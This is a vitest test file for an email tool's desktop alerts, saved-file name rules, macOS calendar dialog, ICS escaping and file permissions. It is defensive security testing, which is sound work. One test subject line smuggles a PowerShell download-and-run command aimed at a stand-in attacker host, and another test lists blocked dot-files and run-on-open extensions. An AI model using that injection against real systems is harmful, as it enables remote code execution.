/**
 * Alert text, files written to disk, and the calendar dialog.
 * Everything runs in temp folders (XDG_* is set before any module reads it).
 */

import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

import { afterAll, beforeEach, describe, expect, it, vi } from 'vitest';

const env = vi.hoisted(() => {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const nodeFs = require('node:fs') as typeof import('node:fs');
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const nodeOs = require('node:os') as typeof import('node:os');
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const nodePath = require('node:path') as typeof import('node:path');
  const root = nodeFs.mkdtempSync(nodePath.join(nodeOs.tmpdir(), 'disk-safety-'));
  for (const key of ['CONFIG', 'DATA', 'STATE', 'CACHE']) {
    process.env[`XDG_${key}_HOME`] = nodePath.join(root, key.toLowerCase());
  }
  return { root };
});

const exec = vi.hoisted(() => ({
  calls: [] as { bin: string; args: string[]; opts: { env?: Record<string, string> } }[],
  scriptCalls: [] as string[],
  answers: [] as unknown[],
}));

vi.mock('node:child_process', async (importOriginal) => {
  const custom = Symbol.for('nodejs.util.promisify.custom');
  const execFile = Object.assign(
    vi.fn((bin: string, args: string[], opts: { env?: Record<string, string> }, cb?: unknown) => {
      exec.calls.push({ bin, args, opts });
      if (typeof cb === 'function') (cb as (e: Error | null) => void)(null);
    }),
    {
      [custom]: async (_bin: string, args: string[]) => {
        const script = args[1] ?? '';
        exec.scriptCalls.push(script);
        const next = exec.answers.shift();
        if (next instanceof Error) throw next;
        return { stdout: typeof next === 'string' ? next : '{"status":"added"}', stderr: '' };
      },
    },
  );
  return { ...(await importOriginal<typeof import('node:child_process')>()), execFile };
});
vi.mock('../logging.js', () => ({ mcpLog: vi.fn().mockResolvedValue(undefined) }));

import CacheStore from '../cache/store.js';
import { isCalendarProcessed, markCalendarProcessed } from '../utils/calendar-state.js';
import { refusedFileName, saveNewFile } from '../utils/save-file.js';
import ImapService from './imap.service.js';
import LocalCalendarService, { escapeICS } from './local-calendar.service.js';
import NotifierService from './notifier.service.js';
import ReminderService from './reminders.service.js';

const mode = async (p: string): Promise<number> => (await fs.stat(p)).mode & 0o777;

beforeEach(() => {
  exec.calls.length = 0;
  exec.scriptCalls.length = 0;
  exec.answers.length = 0;
});

afterAll(async () => {
  await fs.rm(env.root, { recursive: true, force: true });
});

describe('Windows desktop alerts', () => {
  it('passes the alert text as data: no subject text inside the PowerShell script', async () => {
    const subject = 'x’); iwr http://evil.example/p | iex; #';
    const notifier = new NotifierService({
      desktop: true,
      sound: false,
      urgencyThreshold: 'low',
      webhookUrl: '',
      webhookEvents: [],
    });
    const win = (
      NotifierService as unknown as {
        execWindows: (t: string, b: string) => Promise<void>;
      }
    ).execWindows;
    await win.call(NotifierService, 'Title', `From: a\n${subject}`);
    notifier.stop();
    const call = exec.calls.find((c) => c.bin === 'powershell');
    expect(call).toBeDefined();
    const script = call?.args.at(-1) ?? '';
    expect(script).not.toContain('evil');
    expect(script).not.toContain('iex');
    expect(script).not.toContain('’');
    expect(call?.opts.env?.IMAP_WIZARD_ALERT_BODY).toContain(subject);
    expect(call?.opts.env?.IMAP_WIZARD_ALERT_TITLE).toBe('Title');
  });
});

describe('saveNewFile name rules', () => {
  let dir: string;
  beforeEach(async () => {
    dir = await fs.mkdtemp(path.join(os.tmpdir(), 'save-names-'));
  });

  it.each(['.npmrc', '.pre-commit-config.yaml', '.envrc'])('refuses the dot-name %s', async (n) => {
    await expect(saveNewFile(path.join(dir, n), 'g.bin', Buffer.from('x'))).rejects.toThrow(
      /start with a dot/,
    );
    await expect(fs.access(path.join(dir, n))).rejects.toThrow();
  });

  it.each(['run.command', 'x.TERMINAL', 'y.app', 'z.scpt', 'a.sh', 'b.plist'])(
    'refuses the run-on-open name %s',
    async (n) => {
      await expect(saveNewFile(path.join(dir, n), 'g.bin', Buffer.from('x'))).rejects.toThrow(
        /run when opened/,
      );
    },
  );

  it('refuses a generated name that is a dot-name, and still allows normal files', async () => {
    await expect(saveNewFile(`${dir}/`, '.env', Buffer.from('x'))).rejects.toThrow(/dot/);
    expect(refusedFileName('/a/report.pdf')).toBeUndefined();
    const ok = await saveNewFile(path.join(dir, 'report.pdf'), 'g.bin', Buffer.from('x'));
    expect(ok).toBe(path.join(dir, 'report.pdf'));
  });
});

describe('local calendar', () => {
  const realPlatform = process.platform;
  beforeEach(() => {
    Object.defineProperty(process, 'platform', { value: 'darwin' });
  });
  afterAll(() => {
    Object.defineProperty(process, 'platform', { value: realPlatform });
  });

  const start = new Date(2026, 10, 18, 9, 0, 0);
  const end = new Date(2026, 10, 18, 10, 0, 0);

  it('the dialog shows the formatted date and the title escaped once', async () => {
    exec.answers.push('{"status":"cancelled"}');
    const result = await new LocalCalendarService().addEvent(
      { title: 'Say "hi"', start, end },
      undefined,
      { skipDuplicateCheck: true },
    );
    expect(result.status).toBe('cancelled');
    const dialog = exec.scriptCalls[0] ?? '';
    expect(dialog).toContain('Say \\"hi\\"');
    expect(dialog).not.toContain('\\\\\\"');
    expect(dialog).toContain('Nov 18, 2026');
    expect(dialog).toContain('9:00 AM');
    expect(dialog).not.toContain('eventStart as text');
  });

  it('prepare (saving attachments) never runs when the dialog is cancelled', async () => {
    exec.answers.push('{"status":"cancelled"}');
    const prepare = vi.fn().mockResolvedValue({});
    await new LocalCalendarService().addEvent({ title: 'T', start, end, prepare }, undefined, {
      skipDuplicateCheck: true,
    });
    expect(prepare).not.toHaveBeenCalled();
    expect(exec.scriptCalls.some((s) => s.includes('make new event'))).toBe(false);
  });

  it('prepare runs after Add is pressed and before the event is written', async () => {
    exec.answers.push('{"status":"accepted"}', '{"status":"added","eventId":"1"}');
    const order: string[] = [];
    const prepare = vi.fn(async () => {
      order.push(`prepare after ${exec.scriptCalls.length} script(s)`);
      return { notes: 'NOTES-WITH-LINKS' };
    });
    const result = await new LocalCalendarService().addEvent(
      { title: 'T', start, end, prepare },
      undefined,
      { skipDuplicateCheck: true },
    );
    expect(result.status).toBe('added');
    expect(order).toEqual(['prepare after 1 script(s)']);
    expect(exec.scriptCalls[1]).toContain('make new event');
    expect(exec.scriptCalls[1]).toContain('NOTES-WITH-LINKS');
    expect(exec.scriptCalls[1]).not.toContain('display dialog');
  });

  it('an osascript failure never echoes the script or the email text', async () => {
    exec.answers.push(
      Object.assign(new Error('Command failed: osascript -e set x to "SECRET-SUBJECT"'), {
        stderr: 'execution error: The variable NaN is not defined. (-2753)',
      }),
    );
    const result = await new LocalCalendarService().addEvent(
      { title: 'SECRET-SUBJECT', start, end },
      undefined,
      { confirm: false, skipDuplicateCheck: true },
    );
    expect(result.message).not.toContain('SECRET');
    expect(result.message).toContain('NaN is not defined');
  });

  it('the reminder tool never echoes the script either', async () => {
    exec.answers.push(new Error('Command failed: osascript -e name:"SECRET-REMINDER"'));
    const result = await new ReminderService().addReminder({ title: 'SECRET-REMINDER' }, {});
    expect(result.message).not.toContain('SECRET');
  });

  it('refuses an invalid date before building any script', async () => {
    const result = await new LocalCalendarService().addEvent(
      { title: 'T', start: new Date('date unknown'), end },
      undefined,
      {},
    );
    expect(result.status).toBe('no_display');
    expect(exec.scriptCalls).toEqual([]);
  });
});

describe('calendar file text', () => {
  it('escapeICS leaves no carriage return or other control character', () => {
    const out = escapeICS('a\rb\r\nc\u0001d\u0085e');
    expect(out).not.toContain('\r');
    expect(out).not.toContain('\u0001');
    expect(out).not.toContain('\u0085');
    expect(out).toBe('a\\nb\\ncde');
  });
});

describe('file modes', () => {
  it('the calendar state file and folder are owner-only, and concurrent marks keep every entry', async () => {
    await Promise.all(
      Array.from({ length: 12 }, (_, i) => markCalendarProcessed('acct', String(i), 'event')),
    );
    for (let i = 0; i < 12; i += 1) {
      expect(await isCalendarProcessed('acct', String(i))).toBe(true);
    }
    const file = path.join(
      process.env.XDG_STATE_HOME ?? '',
      'email-mcp',
      'calendar-processed.json',
    );
    expect(await mode(file)).toBe(0o600);
    expect(await mode(path.dirname(file))).toBe(0o700);
  });

  it('the cache folder, database and its WAL and SHM files are owner-only', async () => {
    const dir = path.join(env.root, 'cache-wide');
    await fs.mkdir(dir, { mode: 0o755 });
    await fs.chmod(dir, 0o755);
    const file = path.join(dir, 'cache.db');
    const store = new CacheStore(file);
    expect(await mode(dir)).toBe(0o700);
    expect(await mode(file)).toBe(0o600);
    for (const side of [`${file}-wal`, `${file}-shm`]) {
      if (
        await fs.access(side).then(
          () => true,
          () => false,
        )
      ) {
        expect(await mode(side)).toBe(0o600);
      }
    }
    store.close();
  });

  it('saved calendar attachments are 0600 in a 0700 folder', async () => {
    const client = {
      usable: true,
      capabilities: new Set<string>(),
      getMailboxLock: vi.fn().mockResolvedValue({ release: vi.fn() }),
      fetchOne: vi.fn().mockResolvedValue({
        uid: 9,
        envelope: { subject: 'S', messageId: '<s@x>' },
        flags: [],
        bodyStructure: {
          type: 'multipart/mixed',
          childNodes: [
            { part: '1', type: 'text/plain', size: 10 },
            {
              part: '2',
              type: 'application/pdf',
              disposition: 'attachment',
              dispositionParameters: { filename: 'a.pdf' },
              size: 100,
            },
          ],
        },
        headers: Buffer.from('Subject: S\r\n\r\n', 'utf-8'),
      }),
      download: vi.fn().mockImplementation(async () => ({
        content: (async function* () {
          yield Buffer.from('DATA', 'utf-8');
        })(),
      })),
    };
    const service = new ImapService({ getImapClient: async () => client } as never);
    const dest = path.join(await fs.mkdtemp(path.join(os.tmpdir(), 'att-modes-')), 'fresh');
    const { saved } = await service.saveEmailAttachments('test', '9', 'INBOX', dest);
    expect(saved).toHaveLength(1);
    expect(await mode(dest)).toBe(0o700);
    expect(await mode(saved[0]?.localPath ?? '')).toBe(0o600);
    await fs.rm(path.dirname(dest), { recursive: true, force: true });
  });
});
